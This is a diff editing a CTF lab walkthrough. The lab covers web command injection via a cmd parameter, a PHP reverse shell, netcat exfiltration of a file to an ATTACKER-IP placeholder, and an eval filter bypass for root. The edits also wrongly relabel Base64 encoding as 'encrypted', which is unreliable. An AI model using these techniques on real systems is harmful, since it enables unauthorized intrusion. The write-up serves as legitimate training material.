@@ -2,7 +2,7 @@
 ### By Parker Lovin
 
 ## Intro
-Welcome to my walkthrough! This room is one of the most enjoyable CTFs I've completed so far. Let's get started!
+Welcome to my walkthrough! This room is one of the most enjoyable CTFs I have completed so far. Let's get started!
 
 **Note**: Due to the limitations imposed by MD files, I had to include some odd spacings at times to avoid accidental links. If you see a situation that looks like this: "http:// ua.thm", assume that the space would not be there in the actual command/url and was only included in the writeup for formatting purposes.
 
@@ -76,7 +76,7 @@ If you are familiar with Gobuster, feel free to skip this part of the walkthroug
 
 A website (such as ua.thm) can have many components, and directories help organize these components. Consider a hypothetical website called http:// example.com which serves as a shop. It might have a directory called http:// example.com/login, and this would serve as a login page. Similarly, http:// example.com/search might allow a user to search for specific items.
 
-Gobuster takes a wordlist (in this case, a list of common directory names) and searches a website for them. Here is the breakdown of the command we used:
+Gobuster takes a wordlist (in this case, a list of common directory names) and searches a website for those directory names. Here is the breakdown of the command we used:
 
 **gobuster dir**: This tells our machine that we are using the gobuster command to find directories. Gobuster has other functions which are beyond the scope of this room.
 
@@ -130,7 +130,7 @@ Use Firefox to navigate to **http:// ua.thm/assets/index.php**. I had two reason
 
 Admittedly, this section of the writeup is mostly a lucky guess; I was genuinely shocked when it worked! In my Firefox address bar, I typed **http:// ua.thm/assets/index.php?cmd=whoami**. This attempt was inspired by the "Glitch" TryHackMe room, which is among the most difficult rooms to still have an "Easy" rating.
 
-The result was some encoded text: **d3d3LWRhdGEK**. I took this as a good sign since no error message appeared.
+The result was some encrypted text: **d3d3LWRhdGEK**. I took this as a good sign since no error message appeared.
 
 ## index.php and remote command execution explained
 If you understood the previous section of the walkthrough, feel free to skip this one. If you want to dive deeper into what we just did, here you go:
@@ -143,9 +143,9 @@ As I previously mentioned, typing **?cmd=whoami** was a lucky guess based on pas
 **Note:** While I consider sections like this to be fair game in CTFs, it's worth noting that I would never have guessed the answer if I hadn't completed the Glitch room previously. So if you had to get my help on this part, please don't feel badly about it! This sort of guesswork seems pretty rare in CTFs, and this truly is one of those "if you know, you know" sections. **Keep your head up and keep going!**
 
 ## Decoding the text
-CyberChef is my preferred means of decoding text; if you've never used it before, you should consider adding it to your arsenal. I simply copied the encoded text (**d3d3LWRhdGEK**), navigated to the CyberChef website, pasted the text into the input field, and clicked the magic wand in the output field. It produced the output "**www-data**." This is a common username in CTFs.
+CyberChef is my preferred means of decoding text; if you've never used it before, you should consider adding it to your arsenal. I simply copied the encrypted text (**d3d3LWRhdGEK**), navigated to the CyberChef website, pasted the text into the input field, and clicked the magic wand in the output field. It produced the output "**www-data**." This is a common username in CTFs.
 
-By doing this, we have verified two things: our remote command execution is working, and the output is being encoded via Base64.
+By doing this, we have verified two things: our remote command execution is working, and the output is being encrypted via Base64.
 
 ## Decoding the text explained
 The magic wand in CyberChef triggers "magic mode" which automatically detects the type of encoding and attempts to convert it to plaintext.
@@ -165,12 +165,12 @@ On your attacker machine, use `CTRL+C` to stop your Python server. Then enter `n
 
 Return to Firefox and open a new tab. Enter **http:// ua.thm/assets/php-reverse-shell.php**. It may appear that this tab is taking a while to load, but this actually indicates that your shell is successful.
 
-Return to the terminal; if a dollar sign has appeared, you have now established a reverse shell as user www-data!
+Return to the terminal; if a dollar sign has appeared, you have now established a reverse shell as user **www-data**!
 
 ## RCE to reverse shell explained
 If you need more explanation, please read this section. If not, feel free to skip to the next portion of the walkthrough.
 
-Let's start by accepting that we don't need to understand how our PHP script works. It is a commonly used tool in CTFs, and using it is simple as long as you update the IP address to reflect your own IP.
+Let's start by accepting that we don't need to understand how our PHP script works for the purposes of this room. It is a commonly used tool in CTFs, and using it is simple as long as you update the IP address to reflect your own IP.
 
 `python3 -m http.server 80`: This command is starting a web server on our machine. Think of it this way: we (the attackers) are offering the victim the opportunity to download our PHP script.
 
@@ -189,7 +189,7 @@ It is now time for privilege escalation -- moving from user **www-data** to some
 
 Since these efforts did not work, I decided to take stock of what user **www-data** can do. In CTFs, **www-data** can often view sensitive files in the directory **/var/www**. I entered `cd /var/www` to access this directory, then used `ls -la` to view the files that were present. The directory **Hidden_Content** looked suspicious, so I entered `cd Hidden_Content` and then `ls -la` to view its contents.
 
-I then saw a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encoded password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.
+I then saw a suspicious file called **passphrase.txt**. Enter `cat passphrase.txt` to view its contents, and you will see a Base-64 encrypted password. Due to the rules of TryHackMe writeups, I cannot include the encrypted password or the plaintext password here. However, pasting the encrypted password into **CyberChef**'s input field and using magic should give you the plaintext passphrase. I'd suggest writing this passphrase down somewhere; for the rest of the writeup, I will call it **PASSWORD1**.
 
 ## Hitting a roadblock and using a hint
 This section of the writeup covers a failed attempt at switching to a different user. Feel free to skip this section; however, I wanted to include it because it is an important part of how I found the solution.
@@ -212,11 +212,11 @@ drwxrwxr-x 3 www-data www-data   4096 Aug 24 18:57 ..
 
 I recalled that only one image was used in the victim's website, meaning one of these files must be the "unused file" referenced by the hint! I used the following to transfer it to my local machine:
 
-`nc -l -p 4444 > oneforall.jpg' (on my attacker machine)
+`nc -l -p 4444 > oneforall.jpg` (on my attacker machine)
 
-'nc -w 3 {ATTACKER-IP} 4444 < oneforall.jpg' (on the victim machine; remember to replace ATTACKER-IP with your individual attacker IP.)
+`nc -w 3 {ATTACKER-IP} 4444 < oneforall.jpg` (on the victim machine; remember to replace ATTACKER-IP with your individual attacker IP.)
 
-**Note**: Like the PHP script earlier, you don't have to understand the workings of these commands. Even I had to use Nakkaya.com as a reference (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/). Long story short, remember that **these commands are moving the image to our machine** for further analysis.
+**Note**: Like the PHP script earlier, you don't have to understand the workings of these commands for the purposes of this room. Even I had to use Nakkaya.com as a reference (https://nakkaya.com/2009/04/15/using-netcat-for-file-transfers/). Long story short, remember that **these commands are moving the image to our machine** for further analysis.
 
 ## Steganography (finding hidden data in an image)
 On my attacker machine, I double clicked **oneforall.jpg** to display the image. To my surprise, I received this message: **"Error interpreting JPEG image file (Not a JPEG file: starts with 0x89 0x50)."**
@@ -301,7 +301,7 @@ Let's analyze this script:
 
 2) ```[[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]```: Clearly, this script is blocking the user from inputting certain characters.
 
-3) `eval "echo $feedback"`: The eval function means that the expression `"echo $feedback"` is being evaluated. (Note that **$feedback** means we are taking the *value* of **feedback**, and that value is whatever we entered when running the program.)
+3) `eval "echo $feedback"`: The eval function means that the expression `"echo $feedback"` is being evaluated. (Note that **$feedback** means we are taking the *value* of variable **feedback**, and that value is whatever we entered when running the program.)
 
 **The key point of this script** is that we can provide malicious input so that the **eval** function performs a command that helps us get root access.
 
